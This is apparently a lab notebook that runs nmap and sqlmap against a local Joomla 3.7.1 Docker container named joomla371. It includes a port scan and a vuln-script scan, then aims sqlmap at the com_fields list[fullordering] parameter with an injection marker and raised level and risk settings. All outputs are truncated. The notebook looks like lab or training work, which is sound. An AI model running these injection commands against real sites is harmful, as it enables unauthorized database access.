# %%
import os

# %% [markdown]
# Importation des module snecessaire

# %%
os.system('nmap')
# Out:
# Nmap 7.80 ( https://nmap.org )
# Usage: nmap [Scan Type(s)] [Options] {target specification}
# TARGET SPECIFICATION:
#   Can pass hostnames, IP addresses, networks, etc.
#   Ex: scanme.nmap.org, microsoft.com/24, 192.168.0.1; 10.0.0-255.1-254
#   -iL <inputfilename>: Input from list of hosts/networks
#   -iR <num hosts>: Choose random targets
#   --exclude <host1[,host2][,host3],...>: Exclude hosts/networks
#   --excludefile <exclude_file>: Exclude list from file
# HOST DISCOVERY:
#   -sL: List Scan - simply list targets to scan
#   -sn: Ping Scan - disable port scan
#   -Pn: Treat all hosts as online -- skip host discovery
#   -PS/PA/PU/PY[portlist]: TCP SYN/ACK, UDP or SCTP discovery to given ports
#   -PE/PP/PM: ICMP echo, timestamp, and netmask request discovery probes
#   -PO[protocol list]: IP Protocol Ping
#   -n/-R: Never do DNS resolution/Always resolve [default: sometimes]
#   --dns-servers <serv1[,serv2],...>: Specify custom DNS servers
# ...

# %% [markdown]
# Importation des module snecessaire

# %%
os.system('nmap -u joomla371')
# Out:
# Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 13:37 UTC
# Nmap scan report for joomla371 (172.23.0.6)
# Host is up (0.010s latency).
# rDNS record for 172.23.0.6: joomla371.docker-joomla-master-370_default
# Not shown: 999 closed ports
# PORT   STATE SERVICE
# 80/tcp open  http
#
# Nmap done: 1 IP address (1 host up) scanned in 0.99 seconds
# 0

# %%
os.system('nmap -u joomla371 -p 80 --script vuln')
# Out:
# Starting Nmap 7.80 ( https://nmap.org ) at 2022-04-20 13:37 UTC
# Nmap scan report for joomla371 (172.23.0.6)
# Host is up (0.0019s latency).
# rDNS record for 172.23.0.6: joomla371.docker-joomla-master-370_default
#
# PORT   STATE SERVICE
# 80/tcp open  http
# |_clamav-exec: ERROR: Script execution failed (use -d to debug)
# | http-csrf:
# | Spidering limited to: maxdepth=3; maxpagecount=20; withinhost=joomla371
# |   Found the following possible CSRF vulnerabilities:
# |
# |     Path: http://joomla371:80/
# |     Form id: mod-search-searchword93
# |     Form action: /index.php
# |
# |     Path: http://joomla371:80/
# |     Form id: login-form
# |     Form action: /index.php
# |
# |     Path: http://joomla371:80/index.php/component/users/?view=remind&amp;Itemid=101
# |     Form id: mod-search-searchword93
# |     Form action: /index.php/component/users/?Itemid=101
# |
# |     Path: http://joomla371:80/index.php/component/users/?view=remind&amp;Itemid=101
# ...

# %%
os.system('sqlmap -u "http://joomla371/index.php?option=com_fields&view=fields&layout=modal"')
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.4.4#stable}
# |_ -| . ["]     | .'| . |
# |___|_  [)]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:38:08 /2022-04-20/
#
# >?47h8[13:38:08] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla371:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# you have not declared cookie(s), while server wants to set its own ('5e2d0a4f3116da2c2f85981ab374f7df=f14615f030d...67d0a08067'). Do you want to use those [Y/n] Y
# [13:38:10] [INFO] checking if the target is protected by some kind of WAF/IPS
# ...

# %%
os.system('sqlmap -hh')
# Out:
#         ___
#        __H__
#  ___ ___[.]_____ ___ ___  {1.4.4#stable}
# |_ -| . [']     | .'| . |
# |___|_  [,]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# Usage: python3 sqlmap [options]
#
# Options:
#   -h, --help            Show basic help message and exit
#   -hh                   Show advanced help message and exit
#   --version             Show program's version number and exit
#   -v VERBOSE            Verbosity level: 0-6 (default 1)
#
#   Target:
#     At least one of these options has to be provided to define the
#     target(s)
#
#     -u URL, --url=URL   Target URL (e.g. "http://www.site.com/vuln.php?id=1")
#     -d DIRECT           Connection string for direct database connection
#     -l LOGFILE          Parse target(s) from Burp or WebScarab proxy log file
#     -m BULKFILE         Scan multiple targets given in a textual file
#     -r REQUESTFILE      Load HTTP request from a file
# ...

# %%
os.system('sqlmap -u "http://joomla371/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*"')
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.4.4#stable}
# |_ -| . [,]     | .'| . |
# |___|_  [.]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:39:38 /2022-04-20/
#
# >?47h8custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# [13:39:38] [WARNING] it seems that you've provided empty parameter value(s) for testing. Please, always use only valid parameter values so sqlmap could be able to run properly
# [13:39:38] [INFO] testing connection to the target URL
# got a 303 redirect to 'http://joomla371:80/index.php/component/fields/'. Do you want to follow? [Y/n] Y
# ...

# %%
os.system('sqlmap -u "http://joomla371/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=*" --random-agent --level 5 --risk 3')
# Out:
#         ___
#        __H__
#  ___ ___[']_____ ___ ___  {1.4.4#stable}
# |_ -| . ["]     | .'| . |
# |___|_  [(]_|_|_|__,|  _|
#       |_|V...       |_|   http://sqlmap.org
#
# [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
#
# [*] starting @ 13:49:39 /2022-04-20/
#
# >?47h8[13:49:39] [INFO] fetched random HTTP User-Agent header value 'Mozilla/5.0 (Macintosh; U; Intel Mac OS X 10_6_2; nb-no) AppleWebKit/533.16 (KHTML, like Gecko) Version/4.1 Safari/533.16' from file '/usr/share/sqlmap/data/txt/user-agents.txt'
# custom injection marker ('*') found in option '-u'. Do you want to process it? [Y/n/q] Y
# ...
